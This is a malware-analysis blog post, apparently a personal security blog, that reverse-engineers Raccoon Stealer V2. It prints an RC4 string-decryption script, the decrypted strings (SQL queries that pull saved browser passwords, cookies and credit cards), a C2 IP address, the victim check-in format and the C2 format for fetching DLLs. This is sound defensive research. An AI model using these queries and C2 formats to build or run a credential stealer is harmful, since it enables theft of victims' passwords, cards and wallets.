<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Raccoon Stealer - d01a</title><meta name="Description" content="Raccoon Stealer"><meta property="og:title" content="Raccoon Stealer" />
<meta property="og:description" content="Raccoon Stealer" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://d01a.github.io/raccoon-stealer/" /><meta property="og:image" content="https://d01a.github.io/raccoon-stealer/featured-image.jpg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-09-12T11:04:49+08:00" />
<meta property="article:modified_time" content="2023-01-16T02:38:37+02:00" /><meta property="og:site_name" content="d01a" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://d01a.github.io/raccoon-stealer/featured-image.jpg"/>
<meta name="twitter:title" content="Raccoon Stealer"/>
<meta name="twitter:description" content="Raccoon Stealer"/>
<meta name="application-name" content="d01a">
<meta name="apple-mobile-web-app-title" content="d01a"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/Luffy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://d01a.github.io/raccoon-stealer/" /><link rel="next" href="https://d01a.github.io/originlogger/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Raccoon Stealer",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/d01a.github.io\/raccoon-stealer\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/d01a.github.io\/raccoon-stealer\/featured-image.jpg",
                            "width":  660 ,
                            "height":  371 
                        }],"genre": "posts","keywords": "Malware Analysis, Reverse Engineering","wordcount":  2371 ,
        "url": "https:\/\/d01a.github.io\/raccoon-stealer\/","datePublished": "2022-09-12T11:04:49+08:00","dateModified": "2023-01-16T02:38:37+02:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "Mohamed Adel","logo": {
                    "@type": "ImageObject",
                    "url": "https:\/\/d01a.github.io\/images\/avatar.png",
                    "width":  715 ,
                    "height":  715 
                }},"author": {
                "@type": "Person",
                "name": "Mohamed Adel"
            },"description": "Raccoon Stealer"
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="d01a"><span class="header-title-pre"><i class='fa-solid fa-skull' aria-hidden='true'></i></span>d01a</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/d01a" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="d01a"><span class="header-title-pre"><i class='fa-solid fa-skull' aria-hidden='true'></i></span>d01a</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/d01a" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content always-active" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Raccoon Stealer</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://d01a.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mohamed Adel</a></span>&nbsp;<span class="post-category">included in <a href="/categories/malware-analysis/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Malware Analysis</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-09-12">2022-09-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2371 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;12 minutes&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/featured-image.jpg"
        data-srcset="/raccoon-stealer/featured-image.jpg, /raccoon-stealer/featured-image.jpg 1.5x, /raccoon-stealer/featured-image.jpg 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/featured-image.jpg"
        title="Raccoon Stealer" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#first-look">First Look</a></li>
        <li><a href="#dynamically-resolving-dlls-and-apis">Dynamically resolving DLLs and APIs</a></li>
        <li><a href="#decrypting-the-encrypted-data">Decrypting the encrypted data</a></li>
        <li><a href="#alert-the-server-with-a-new-victim-info">Alert the server with a new victim Info</a></li>
        <li><a href="#install-required-libraries">Install required libraries</a></li>
        <li><a href="#get-victim-machine-information">Get victim machine information</a></li>
        <li><a href="#steal-user-information-saved-in-browser">Steal User information saved in Browser</a>
          <ul>
            <li><a href="#chrome-based">Chrome Based</a></li>
            <li><a href="#firefox">FireFox</a></li>
          </ul>
        </li>
        <li><a href="#steal-crypto-wallets-information">Steal Crypto wallets information</a></li>
        <li><a href="#grabbing-files">grabbing Files</a></li>
        <li><a href="#telegram-connection">Telegram connection</a></li>
        <li><a href="#take-screenshot">Take screenshot</a></li>
        <li><a href="#loading-next-stage">Loading Next stage</a></li>
      </ul>
    </li>
    <li><a href="#iocs">IOCs:</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="conclusion">Conclusion</h2>
<p>Raccoon Stealer V2 (or RecordBreaker) Is a stealer that provided as a service with about 200$/m. It is a new version of Raccoon stealer that appeared in 2019 and died for a while then it returns with this new Stealer which known as RecordBreaker.<br>
It Comes with a lot of capabilities, It can grab a lot of sensitive information like :</p>
<ol>
<li>Steal Victim System information</li>
<li>Steal Victim Username and passwords stored in the browser</li>
<li>Steal Victim Browser&rsquo;s Autofill Information</li>
<li>Steal Credit Card information</li>
<li>Steal Crypto wallets Information</li>
<li>Steal Bitcoin Wallets</li>
<li>Grab any file from the victim system</li>
<li>Take Screenshots from the victim system</li>
<li>Load next stage</li>
</ol>
<h2 id="analysis">Analysis</h2>
<h3 id="first-look">First Look</h3>
<p>First we start with basic analysis, using Detect it easy we see that the file seems to be not packed. Exploring the strings tab, we see a lot of base64 encoded strings and two registry keys <code>SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</code> and <code>SOFTWARE\Microsoft\Cryptography</code></p>
<p><figure><a class="lightgallery" href="/raccoon-stealer/img/strings1.png" title="Strings" data-thumbnail="/raccoon-stealer/img/strings1.png" data-sub-html="<h2>Strings</h2><p>Strings</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/raccoon-stealer/img/strings1.png"
            data-srcset="/raccoon-stealer/img/strings1.png, /raccoon-stealer/img/strings1.png 1.5x, /raccoon-stealer/img/strings1.png 2x"
            data-sizes="auto"
            alt="/raccoon-stealer/img/strings1.png" width="474" height="425" />
    </a><figcaption class="image-caption">Strings</figcaption>
    </figure></p>
<p>trying to encode the base64 strings will produce encrypted data so i think thats all with basic insights about the executable and lets upload the sample to IDA (and ghidra for decompiling)</p>
<h3 id="dynamically-resolving-dlls-and-apis">Dynamically resolving DLLs and APIs</h3>
<p>In the entry function we see two function calls at the very beginning to <code>sub_401000</code> and <code>sub_404036</code>. by navigating to <code>sub_401000</code> we see that this function resolve the required APIs</p>
<p><figure><a class="lightgallery" href="/raccoon-stealer/img/dll_list.png" title="sub_401000" data-thumbnail="/raccoon-stealer/img/dll_list.png" data-sub-html="<h2>dll loaded</h2><p>sub_401000</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/raccoon-stealer/img/dll_list.png"
            data-srcset="/raccoon-stealer/img/dll_list.png, /raccoon-stealer/img/dll_list.png 1.5x, /raccoon-stealer/img/dll_list.png 2x"
            data-sizes="auto"
            alt="/raccoon-stealer/img/dll_list.png" width="606" height="601" />
    </a><figcaption class="image-caption">dll loaded</figcaption>
    </figure></p>
<h3 id="decrypting-the-encrypted-data">Decrypting the encrypted data</h3>
<p>After going back to to the entry function, After resolving the APIs there is another function call <code>sub_404036</code> . This function takes a pattern that seems to be decrypting the data. The sequence is a call to <code>sub_00401806</code> that calls <code>CryptStringToBinaryA</code> after calling <code>LstrLenA</code>. The call to <code>CryptStringToBinaryA</code> takes a the <code>dwFlags</code> parameter <code>0x00000001 (CRYPT_STRING_BASE64)</code> which decode the string using base64 encoding routine and returns a byte array contains the base64-decoded encrypted data.</p>
<p><figure><a class="lightgallery" href="/raccoon-stealer/img/decrypt.png" title="decrypt" data-thumbnail="/raccoon-stealer/img/decrypt.png" data-sub-html="<h2>decrypt</h2><p>decrypt</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/raccoon-stealer/img/decrypt.png"
            data-srcset="/raccoon-stealer/img/decrypt.png, /raccoon-stealer/img/decrypt.png 1.5x, /raccoon-stealer/img/decrypt.png 2x"
            data-sizes="auto"
            alt="/raccoon-stealer/img/decrypt.png" width="696" height="509" />
    </a><figcaption class="image-caption">decrypt</figcaption>
    </figure></p>
<p>after decrypting the string there are calls to <code>sub_0040A59A</code> function that convert the resulting strings to unicode strings by calling <code>MultiByteToWideChar</code></p>
<p>to get all the decrypted strings we can use the debugger or by making a script to decrypt them for us</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">ARC4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">strings</span> <span class="o">=</span> <span class="p">[</span>  <span class="s1">&#39;fVQMox8c&#39;</span><span class="p">,</span><span class="s1">&#39;bE8Yjg==&#39;</span><span class="p">,</span><span class="s1">&#39;bkoJoy0=&#39;</span><span class="p">,</span><span class="s1">&#39;LEtihSAW6eunMDV+Aes3rVhAClFoaQM=&#39;</span><span class="p">,</span><span class="o">...</span><span class="p">,</span><span class="s1">&#39;59c9737264c0b3209d9193b8ded6c127&#39;</span><span class="p">,</span><span class="s1">&#39;XVHmGYV5cH1pvOC0w/cmantl/oG9aw==&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;edinayarossiya&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">strings</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">cipher</span> <span class="o">=</span> <span class="n">ARC4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>the decrypted strings:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">tlgrm_
</span></span><span class="line"><span class="cl">ews_
</span></span><span class="line"><span class="cl">grbr_
</span></span><span class="line"><span class="cl">%s\tTRUE\t%s\t%s\t%s\t%s\t%s\n
</span></span><span class="line"><span class="cl">URL:%s\nUSR:%s\nPASS:%s\n
</span></span><span class="line"><span class="cl">\t\t%d) %s\n
</span></span><span class="line"><span class="cl">\t- Locale: %s\n
</span></span><span class="line"><span class="cl">\t- OS: %s\n
</span></span><span class="line"><span class="cl">\t- RAM: %d MB\n
</span></span><span class="line"><span class="cl">\t- Time zone: %c%ld minutes from GMT\n
</span></span><span class="line"><span class="cl">\t- Display size: %dx%d\n
</span></span><span class="line"><span class="cl">\t- Architecture: x%d\n
</span></span><span class="line"><span class="cl">\t- CPU: %s (%d cores)\n
</span></span><span class="line"><span class="cl">\t- Display Devices:\n%s\n
</span></span><span class="line"><span class="cl">formhistory.sqlite
</span></span><span class="line"><span class="cl">logins.json
</span></span><span class="line"><span class="cl">\\autofill.txt
</span></span><span class="line"><span class="cl">\\cookies.txt
</span></span><span class="line"><span class="cl">\\passwords.txt
</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded; charset=utf-8
</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=
</span></span><span class="line"><span class="cl">Content-Type: text/plain;
</span></span><span class="line"><span class="cl">User Data
</span></span><span class="line"><span class="cl">wallets
</span></span><span class="line"><span class="cl">wlts_
</span></span><span class="line"><span class="cl">ldr_
</span></span><span class="line"><span class="cl">scrnsht_
</span></span><span class="line"><span class="cl">sstmnfo_
</span></span><span class="line"><span class="cl">token:
</span></span><span class="line"><span class="cl">nss3.dll
</span></span><span class="line"><span class="cl">sqlite3.dll
</span></span><span class="line"><span class="cl">SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion
</span></span><span class="line"><span class="cl">PATH
</span></span><span class="line"><span class="cl">ProductName
</span></span><span class="line"><span class="cl">Web Data
</span></span><span class="line"><span class="cl">sqlite3_prepare_v2
</span></span><span class="line"><span class="cl">sqlite3_open16
</span></span><span class="line"><span class="cl">sqlite3_close
</span></span><span class="line"><span class="cl">sqlite3_step
</span></span><span class="line"><span class="cl">sqlite3_finalize
</span></span><span class="line"><span class="cl">sqlite3_column_text16
</span></span><span class="line"><span class="cl">sqlite3_column_bytes16
</span></span><span class="line"><span class="cl">sqlite3_column_blob
</span></span><span class="line"><span class="cl">SELECT origin_url, username_value, password_value FROM logins
</span></span><span class="line"><span class="cl">SELECT host_key, path, is_secure , expires_utc, name, encrypted_value FROM cookies
</span></span><span class="line"><span class="cl">SELECT name, value FROM autofill
</span></span><span class="line"><span class="cl">pera
</span></span><span class="line"><span class="cl">Stable
</span></span><span class="line"><span class="cl">SELECT host, path, isSecure, expiry, name, value FROM moz_cookies
</span></span><span class="line"><span class="cl">SELECT fieldname, value FROM moz_formhistory
</span></span><span class="line"><span class="cl">cookies.sqlite
</span></span><span class="line"><span class="cl">machineId=
</span></span><span class="line"><span class="cl">&amp;configId=
</span></span><span class="line"><span class="cl">&#34;encrypted_key&#34;:&#34;
</span></span><span class="line"><span class="cl">stats_version&#34;:&#34;
</span></span><span class="line"><span class="cl">Content-Type: application/x-object
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;
</span></span><span class="line"><span class="cl">POST
</span></span><span class="line"><span class="cl">MachineGuid
</span></span><span class="line"><span class="cl">image/jpeg
</span></span><span class="line"><span class="cl">GdiPlus.dll
</span></span><span class="line"><span class="cl">Gdi32.dll
</span></span><span class="line"><span class="cl">GdiplusStartup
</span></span><span class="line"><span class="cl">GdipDisposeImage
</span></span><span class="line"><span class="cl">GdipGetImageEncoders
</span></span><span class="line"><span class="cl">GdipGetImageEncodersSize
</span></span><span class="line"><span class="cl">GdipCreateBitmapFromHBITMAP
</span></span><span class="line"><span class="cl">GdipSaveImageToFile
</span></span><span class="line"><span class="cl">BitBlt
</span></span><span class="line"><span class="cl">CreateCompatibleBitmap
</span></span><span class="line"><span class="cl">CreateCompatibleDC
</span></span><span class="line"><span class="cl">DeleteObject
</span></span><span class="line"><span class="cl">GetObjectW
</span></span><span class="line"><span class="cl">SelectObject
</span></span><span class="line"><span class="cl">SetStretchBltMode
</span></span><span class="line"><span class="cl">StretchBlt
</span></span><span class="line"><span class="cl">SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards
</span></span><span class="line"><span class="cl">NUM:%s\nHOLDER:%s\nEXP:%s/%s\n
</span></span><span class="line"><span class="cl">\\CC.txt
</span></span><span class="line"><span class="cl">NSS_Init
</span></span><span class="line"><span class="cl">NSS_Shutdown
</span></span><span class="line"><span class="cl">PK11_GetInternalKeySlot
</span></span><span class="line"><span class="cl">PK11_FreeSlot
</span></span><span class="line"><span class="cl">PK11_Authenticate
</span></span><span class="line"><span class="cl">PK11SDR_Decrypt
</span></span><span class="line"><span class="cl">SECITEM_FreeItem
</span></span><span class="line"><span class="cl">hostname&#34;:&#34;
</span></span><span class="line"><span class="cl">&#34;,&#34;httpRealm&#34;:
</span></span><span class="line"><span class="cl">encryptedUsername&#34;:&#34;
</span></span><span class="line"><span class="cl">&#34;,&#34;encryptedPassword&#34;:&#34;
</span></span><span class="line"><span class="cl">&#34;,&#34;guid&#34;:
</span></span><span class="line"><span class="cl">Profiles
</span></span><span class="line"><span class="cl">b&#34;\xee\xefV&gt;\x0c\xb5Ge\xb6,A\xef\x87=g)&#39;\x99\x0c\xbf7iT\xfd&#34;
</span></span><span class="line"><span class="cl">b&#39;Ti\x8d\xc8\xf7:\xdc\x9f\xeb\xff\xdc\xef\xb1\x154\xb4*\x00\x87\xd9\xf0q&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>as we can see, the last two strings seems not to be decrypted. If we go back the <code>start</code> function we see that the string <code>59c9737264c0b3209d9193b8ded6c127</code> is a different key used to decrypt the string <code>XVHmGYV5cH1pvOC0w/cmantl/oG9aw==</code> and the decrypted string is</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">http://51.195.166.184/
</span></span></code></pre></td></tr></table>
</div>
</div><p>there are some other decryption routines using the same key but the strings are empty.</p>
<p>then, the attacker retrieves the locale name which is <code>&lt;language&gt;-&lt;REGION&gt;</code> and compare it against <code>ru</code> for some reason, but the flow didn&rsquo;t changed if it is!</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/locale_name.png"
        data-srcset="/raccoon-stealer/img/locale_name.png, /raccoon-stealer/img/locale_name.png 1.5x, /raccoon-stealer/img/locale_name.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/locale_name.png"
        title="locale" width="636" height="351" /></p>
<p>The attacker open a mutex with a name <code>8724643052</code> and if it existed, the malware terminate itself and if it is not existed it creates a mutex with that name.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/mutex.png"
        data-srcset="/raccoon-stealer/img/mutex.png, /raccoon-stealer/img/mutex.png 1.5x, /raccoon-stealer/img/mutex.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/mutex.png"
        title="mutex" width="550" height="313" /></p>
<h3 id="alert-the-server-with-a-new-victim-info">Alert the server with a new victim Info</h3>
<p>The next call is to check if the victim running as local system by making a call to <code>GetTokenInformation</code> to retrieve the token user data that include SID and then check this SID with <code>S-1-5-18</code> to see if the user is running as a <code>LocalSystem</code> or not. If it is, the function returns 1 and not returns 0</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/SID.png"
        data-srcset="/raccoon-stealer/img/SID.png, /raccoon-stealer/img/SID.png 1.5x, /raccoon-stealer/img/SID.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/SID.png"
        title="sid" width="747" height="599" /></p>
<p>The next few instruction retrieves a decrypted strings: <code>Content-Type: application/x-www-form-urlencoded; charset=utf-8</code> and <code>*/*</code> then calls a function that formats the input with a given pattern, This function is referenced in a lot of places in the sample.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/str_forma_xrefs.png"
        data-srcset="/raccoon-stealer/img/str_forma_xrefs.png, /raccoon-stealer/img/str_forma_xrefs.png 1.5x, /raccoon-stealer/img/str_forma_xrefs.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/str_forma_xrefs.png"
        title="str" width="689" height="286" /></p>
<p>this function format the input string with <code>\r\n</code> appended to it and calls the function that seems to be that does the formatting procedures and it&rsquo;s used in so many places</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/str_format.png"
        data-srcset="/raccoon-stealer/img/str_format.png, /raccoon-stealer/img/str_format.png 1.5x, /raccoon-stealer/img/str_format.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/str_format.png"
        title="str" width="1126" height="586" /></p>
<p>Then the malware make a call to a function <code>sub_0040A720</code> after allocating two regions in the memory .if we navigate to this function we see that it first reference the previously allocated memory and the open the registry key <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\</code> and read the value <code>MachineGuid</code> and returns it in EAX register</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/GUID.png"
        data-srcset="/raccoon-stealer/img/GUID.png, /raccoon-stealer/img/GUID.png 1.5x, /raccoon-stealer/img/GUID.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/GUID.png"
        title="guid" width="764" height="601" /></p>
<p>then the malware retrieves the username of the current user and makes some formatting to the data before sending it. The formatted data are some information about the victim machine like:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">machineId=&lt;GUID&gt;|&lt;username&gt;&amp;confId=&lt;predefined value&gt;
</span></span><span class="line"><span class="cl">machineId=d8874349-72d5-492c-8d8c-5e6d3a68e127|d01a&amp;configId=59c9737264c0b3209d9193b8ded6c127
</span></span></code></pre></td></tr></table>
</div>
</div><p>configId used is the key used to decrypt the C2 IP address .
Now, the first piece of data is ready to be sent to the attacker and the function <code>sub_004079F3</code> did this. First, the function references the IP of the C2 server and make some comparisons to its beginning to make sure that it&rsquo;s in a valid format. Then it gets a pointer to <code>/</code> at the end of the IP address and then make a call to <code>InternetOpenW(&quot;record&quot;,0,0,0)</code> it parameter is the User-Agent of the request sent .now it&rsquo;s ready to connect to the remote server, so it connects to the remote server over http transfer protocol and port 443, the default for https transfer protocol</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/connect.png"
        data-srcset="/raccoon-stealer/img/connect.png, /raccoon-stealer/img/connect.png 1.5x, /raccoon-stealer/img/connect.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/connect.png"
        title="connect" width="696" height="468" /></p>
<p>Then it sends the data to the C2 server set before. The content type sent in the request in the form <code>Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\r\n\r\n</code> and the data sent in the <code>OptionalHeader</code> parameter which sent after the request headers. And after sending the data it waits for a response from the server. Then it parses the response for a specific field contain the word <code>Token:</code> if it found it continue running if it is not, it exits.</p>
<h3 id="install-required-libraries">Install required libraries</h3>
<p>It search for the <code>libs</code> word in the response in order to prepare a legitimate DLL that are required for the malware to run. the command can be in form:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">libs_nss3:http://{HOSTADDR}/{RANDOM_STRING}/nss3.dll
</span></span><span class="line"><span class="cl">libs_msvcp140:http://{HOSTADDR}/{RANDOM_STRING}/msvcp140.dll libs_vcruntime140:http://{HOSTADDR}/{RANDOM_STRING}/vcruntime140.dll
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/libs.png"
        data-srcset="/raccoon-stealer/img/libs.png, /raccoon-stealer/img/libs.png 1.5x, /raccoon-stealer/img/libs.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/libs.png"
        title="libs" width="332" height="113" /></p>
<h3 id="get-victim-machine-information">Get victim machine information</h3>
<p>Then, It retrieves the path of Local AppData <code>C:\Users\d01a\AppData\Local</code> by calling <code>SHGetFolderPathW</code> from the function <code>sub_0040A323</code> and format it by adding the word <code>Low</code> at the end of the path
then it adds the path to sqlite3.dll and other downloaded DLLs to the PATH environment variables</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
